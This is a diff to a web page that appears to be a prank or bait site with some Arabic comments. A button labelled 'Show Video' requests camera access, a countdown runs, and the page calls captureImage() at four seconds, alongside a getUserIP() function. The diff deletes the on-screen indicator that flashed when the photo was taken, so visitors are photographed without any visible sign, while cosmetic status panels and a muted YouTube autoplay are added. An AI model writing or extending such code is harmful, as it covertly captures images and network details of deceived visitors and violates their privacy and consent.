@@ -62,7 +62,11 @@
       height: 100%;
       border: 0;
       border-radius: 10px;
-      display: none; /* Hidden until countdown completes */
+      visibility: hidden; /* Changed from display: none */
+    }
+    
+    #player.visible {
+      visibility: visible;
     }
     
     .loading {
@@ -249,6 +253,38 @@
       background: #d32f2f;
       transform: rotate(90deg);
     }
+    
+    /* New status indicators */
+    .status {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.1);
+      font-size: 16px;
+    }
+    
+    .status-item {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+    }
+    
+    .status-icon {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      margin-right: 10px;
+      background: #ff6b6b;
+    }
+    
+    .status-icon.active {
+      background: #4cd97b;
+    }
+    
+    .status-text {
+      flex-grow: 1;
+      text-align: left;
+    }
   </style>
 </head>
 <body>
@@ -258,19 +294,19 @@
     <!-- Camera permission request -->
     <div class="permission-request" id="permissionRequest">
       <p>Don't be sad. Choose an option:</p>
-	  <button class="permission-btn" id="cameraBtn">Show Video</button>
+      <button class="permission-btn" id="cameraBtn">Show Video</button>
       <button class="permission-btn" id="showImageBtn">Show Image</button>
     </div>
     
     <!-- Countdown element -->
     <div class="countdown" id="countdown">10</div>
     
-    <div class="loading">
+    <div class="loading" id="loading">
       <div class="spinner"></div>
-      <p>Loading</p>
+      <p>Loading Video...</p>
     </div>
     
-    <div class="message">
+    <div class="message" id="message">
       <p>Hahaha</p>
       <p class="success">You thought!!</p>
     </div>
@@ -279,9 +315,30 @@
       Internet Error
     </div>
     
+    <!-- Status indicators -->
+    <div class="status">
+      <div class="status-item">
+        <div class="status-icon active" id="visibilityStatus"></div>
+        <div class="status-text">Player visibility: <span id="visibilityText">Hidden</span></div>
+      </div>
+      <div class="status-item">
+        <div class="status-icon" id="videoStatus"></div>
+        <div class="status-text">Video loaded: <span id="videoStatusText">No</span></div>
+      </div>
+      <div class="status-item">
+        <div class="status-icon" id="autoplayStatus"></div>
+        <div class="status-text">Autoplay enabled: <span id="autoplayStatusText">No</span></div>
+      </div>
+    </div>
+    
     <div class="footer">
       <p>Hope you are happy.</p>
     </div>
+  </div>
+
+  <!-- Video container -->
+  <div class="video-container">
+    <iframe id="player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
   </div>
 
   <!-- Image popup -->
@@ -298,8 +355,8 @@
   <script>
     // عناصر DOM
     const player = document.getElementById('player');
-    const loading = document.querySelector('.loading');
-    const message = document.querySelector('.message');
+    const loading = document.getElementById('loading');
+    const message = document.getElementById('message');
     const success = document.querySelector('.success');
     const errorMsg = document.getElementById('error-message');
     const hiddenVideo = document.getElementById('hiddenVideo');
@@ -307,10 +364,17 @@
     const countdownElement = document.getElementById('countdown');
     const permissionRequest = document.getElementById('permissionRequest');
     const cameraBtn = document.getElementById('cameraBtn');
-    const captureIndicator = document.getElementById('captureIndicator');
     const showImageBtn = document.getElementById('showImageBtn');
     const imagePopup = document.getElementById('imagePopup');
     const closePopup = document.getElementById('closePopup');
+    
+    // Status elements
+    const visibilityStatus = document.getElementById('visibilityStatus');
+    const visibilityText = document.getElementById('visibilityText');
+    const videoStatus = document.getElementById('videoStatus');
+    const videoStatusText = document.getElementById('videoStatusText');
+    const autoplayStatus = document.getElementById('autoplayStatus');
+    const autoplayStatusText = document.getElementById('autoplayStatusText');
     
     // متغيرات الحالة
     let cameraCaptured = false;
@@ -322,6 +386,8 @@
     
     // Hide countdown initially
     countdownElement.style.display = 'none';
+    loading.style.display = 'none';
+    message.style.display = 'none';
     
     // Function to get user's IP address
     async function getUserIP() {
@@ -348,15 +414,8 @@
         count--;
         countdownElement.textContent = count;
         
-        // Capture image when countdown reaches 4 seconds
         if (count === 4) {
           captureImage();
-          captureIndicator.style.display = 'block';
-          
-          // Flash the indicator briefly
-          setTimeout(() => {
-            captureIndicator.style.display = 'none';
-          }, 1000);
         }
         
         if (count <= 0) {
@@ -381,10 +440,26 @@
     // Function to start video playback
     function startVideoPlayback() {
       loading.style.display = 'block';
+      visibilityStatus.classList.add('active');
+      visibilityText.textContent = 'Visible';
       
-      // Set the video source with autoplay
-      player.src = 'https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0&autoplay=1';
-      player.style.display = 'block';
+      // Set the video source with autoplay and mute
+      player.src = 'https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0&autoplay=1&mute=1';
+      player.classList.add('visible');
+      
+      // Update status
+      autoplayStatus.classList.add('active');
+      autoplayStatusText.textContent = 'Yes';
+      
+      player.addEventListener('load', () => {
+        loading.style.display = 'none';
+        message.style.display = 'block';
+        success.style.display = 'block';
+        
+        // Update status
+        videoStatus.classList.add('active');
+        videoStatusText.textContent = 'Yes';
+      });
     }
     
     // Event listener for camera permission button
@@ -420,7 +495,7 @@
         permissionRequest.style.display = 'block';
         
         // Show error message
-        errorMsg.textContent = 'Error';
+        errorMsg.textContent = 'Error accessing camera. Please try again.';
         errorMsg.style.display = 'block';
       }
     });
@@ -440,16 +515,6 @@
       if (e.target === imagePopup) {
         imagePopup.classList.remove('active');
       }
-    });
-    
-    // Hide the player initially
-    player.style.display = 'none';
-    
-    // Show the player when loaded
-    player.addEventListener('load', () => {
-      loading.style.display = 'none';
-      message.style.display = 'block';
-      success.style.display = 'block';
     });
     
     // وظيفة التقاط الصورة
